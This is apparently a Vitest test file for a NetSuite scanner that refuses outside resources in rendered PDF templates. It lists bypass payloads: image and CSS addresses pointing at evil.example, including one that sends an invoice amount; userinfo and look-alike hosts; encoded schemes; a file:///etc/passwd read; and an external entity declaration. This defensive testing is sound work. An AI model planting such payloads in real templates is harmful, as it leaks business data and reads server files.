import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

// Load the SuiteScript AMD module as NetSuite would: run it with a define() that hands back the factory's result.
const file = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../../netsuite/src/FileCabinet/SuiteScripts/ns_agent/lib/resource_scan.js");
let scan!: { renderedResourceIssues(markup: unknown): string[]; addressIssue(address: string): string | undefined };
new Function("define", readFileSync(file, "utf8"))((deps: string[], factory: () => typeof scan) => {
  expect(deps).toEqual([]);
  scan = factory();
});

const doc = (body: string, head = "") =>
  `<?xml version="1.0"?>\n<!DOCTYPE pdf PUBLIC "-//big.faceless.org//report" "report-1.1.dtd">\n<pdf><head>${head}</head><body size="Letter">${body}</body></pdf>`;

describe("renderedResourceIssues (pdf_rl.js render-then-scan)", () => {
  it("passes a plain rendered invoice with NetSuite-hosted resources", () => {
    const markup = doc(
      '<img src="https://1234567.app.netsuite.com/core/media/media.nl?id=1&amp;c=1234567&amp;h=abc" width="120"/>' +
        '<img src="/core/media/media.nl?id=2"/><a href="#top">top</a><img src="data:image/png;base64,iVBORw0KGgo="/>' +
        "<h1>INV-1001</h1><p>Acme &amp; Co</p>",
      '<link name="NotoSans" type="font" subtype="truetype" src="https://system.netsuite.com/c.1/NotoSans-Regular.ttf" bytes="2"/>' +
        "<style>th { background-color: #eeeeee; } td { background-image: url('/core/media/media.nl?id=3'); }</style>",
    );
    expect(scan.renderedResourceIssues(markup)).toEqual([]);
  });

  // Each case is what a bypass of the source lint renders to: after FreeMarker runs, the address is plain text.
  it.each([
    ["a shadowed companyInformation.logoUrl", '<img src="https://evil.example/ACME%20Corp"/>', "address outside NetSuite: evil.example"],
    ["an attribute assembled from pieces", '<img src="https://evil.example/?d=1250.00"/>', "address outside NetSuite"],
    ["userinfo before the host", '<img src="https://x.netsuite.com@evil.example/x.png"/>', "user part"],
    ["a port and userinfo", '<img src="https://x.netsuite.com:443@evil.example/x.png"/>', "user part"],
    ["a protocol-relative outside host", '<img src="//evil.example/x.png"/>', "address outside NetSuite"],
    ["an entity-encoded scheme", '<img src="h&#116;tps://evil.example/x.png"/>', "address outside NetSuite"],
    ["a hex entity in the host", '<img src="https://evil&#x2e;example/x.png"/>', "address outside NetSuite: evil.example"],
    ["a look-alike host", '<img src="https://netsuite.com.evil.example/x.png"/>', "address outside NetSuite"],
    ["a suffix look-alike", '<img src="https://evilnetsuite.com/x.png"/>', "address outside NetSuite"],
    ["a single-quoted value", "<img src='https://evil.example/x.png'/>", "address outside NetSuite"],
    ["an unquoted value", "<img src=https://evil.example/x.png />", "address outside NetSuite"],
    ["a quote and > inside the value", '<img alt="a>b" src="https://evil.example/a\'b"/>', "address outside NetSuite"],
    ["a background attribute", '<td background="https://evil.example/bg.png">x</td>', "background: address outside NetSuite"],
    ["a background-image attribute", '<td background-image="https://evil.example/bg.png">x</td>', "address outside NetSuite"],
    ["object data", '<object data="https://evil.example/x"/>', "data: address outside NetSuite"],
    ["xlink:href", '<svg><image xlink:href="https://evil.example/x.png"/></svg>', "xlink:href"],
    ["an absolute address in any attribute", '<div title="https://evil.example/x">x</div>', "title: address outside NetSuite"],
    ["a style attribute url()", "<div style=\"background-image: url('https://evil.example/x.png')\">x</div>", "address outside NetSuite"],
    ["a CSS-escaped url()", '<div style="background-image: \\75 rl(https://evil.example/x.png)">x</div>', "address outside NetSuite"],
    ["a style element url()", "", "address outside NetSuite", "<style>td { background-image: url(https://evil.example/x.png); }</style>"],
    ["a CDATA style element", "", "address outside NetSuite", "<style><![CDATA[td { background: url(//evil.example/x.png) }]]></style>"],
    ["CSS @import", "", "@import", '<style>@import "https://system.netsuite.com/x.css";</style>'],
    ["an escaped @import", "", "@import", '<style>@\\69mport "x.css";</style>'],
    ["a file: address", '<img src="file:///etc/passwd"/>', "scheme not allowed"],
    ["a jar: address", '<img src="jar:file:/x.jar!/a.png"/>', "scheme not allowed"],
    ["a backslash address", '<img src="https:\\\\evil.example\\x.png"/>', "scheme not allowed"],
    ["an entity declaration", "", "entity declarations", '<!ENTITY e SYSTEM "https://evil.example/x">'],
  ])("refuses %s", (_name, body, message, head = "") => {
    const issues = scan.renderedResourceIssues(doc(body, head));
    expect(issues.join("\n")).toContain(message);
  });

  it("caps the number of issues reported", () => {
    const body = Array.from({ length: 30 }, (_, i) => `<img src="https://evil${i}.example/x.png"/>`).join("");
    expect(scan.renderedResourceIssues(doc(body))).toHaveLength(10);
  });

  it("refuses something that is not text", () => {
    expect(scan.renderedResourceIssues(undefined)).toEqual(["rendered template is not text"]);
  });
});
